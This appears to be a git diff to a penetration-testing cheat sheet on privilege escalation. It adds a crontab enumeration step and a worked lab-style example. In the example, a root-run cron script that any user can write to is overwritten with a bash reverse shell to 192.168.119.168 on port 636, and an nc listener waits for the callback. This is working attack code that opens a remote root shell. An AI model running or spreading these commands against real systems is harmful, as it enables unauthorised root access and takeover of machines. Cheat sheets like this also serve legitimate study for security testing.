@@ -458,7 +458,10 @@ find / -xdev -type f -perm -0002 -ls 2> /dev/null
 ````
 find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
 ````
-
+### Crontab 
+````
+cat /etc/crontab
+````
 ## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
 ### Windows Binaries
 ````
@@ -736,6 +739,33 @@ sh-3.2# id
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ````
+### cat /etc/crontab
+#### bash file
+````
+useradm@mailman:~/scripts$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1
+
+echo " " > cleanup.sh
+echo '#!/bin/bash' > cleanup.sh
+echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
+nc -nlvp 636 #wait 5 minutes
+````
+
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
 ### User Account Control (UAC) Bypass
 UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
